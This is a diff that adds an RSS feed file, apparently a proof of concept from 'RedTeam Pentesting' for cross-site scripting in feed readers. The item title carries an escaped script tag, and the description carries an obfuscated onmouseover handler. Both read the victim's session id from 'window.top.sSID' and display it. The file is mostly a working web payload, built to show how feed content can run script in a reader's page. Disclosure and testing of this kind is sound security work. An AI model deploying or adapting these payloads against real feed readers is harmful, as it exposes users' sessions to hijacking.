@@ -1,0 +1,26 @@
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;rss version=&quot;2.0&quot;&gt;
+&lt;channel&gt;
+    &lt;title&gt;RedTeam Pentesting&lt;/title&gt;
+    &lt;link
+      href=&quot;http://www.example.come&quot;
+      rel=&quot;self&quot;
+      type=&quot;application/rss+xml&quot; /&gt;
+    &lt;link&gt;http://www.example.come&lt;/link&gt;
+    &lt;description&gt;Seeing your network from the attacker&#039;s perspective&lt;/description&gt;
+    &lt;pubDate&gt;Mon, 16 Apr 2009 05:23:42 +0000&lt;/pubDate&gt;
+    &lt;language&gt;de&lt;/language&gt;
+    &lt;item&gt;
+      &lt;title&gt;&amp;lt;script&amp;gt;alert(&#039;Title: Your session id is: &#039; +
+window.top.sSID);&amp;lt;/script&amp;gt;&lt;/title&gt;
+      &lt;link&gt;http://www.example.come/pentest&lt;/link&gt;
+      &lt;pubDate&gt;Mon, 16 Apr 2009 05:23:42 +0000&lt;/pubDate&gt;
+      &lt;description&gt;
+        &amp;lt;div o&amp;lt;xml&amp;gt;nmouseover=&amp;quot;alert(&#039;Description: Your session id is: &#039; +
+window.top.sSID)&amp;quot;&amp;gt;
+          RedTeam Pentesting XSS
+        &amp;lt;/div&amp;gt;
+      &lt;/description&gt;
+    &lt;/item&gt;
+  &lt;/channel&gt;
+&lt;/rss&gt;
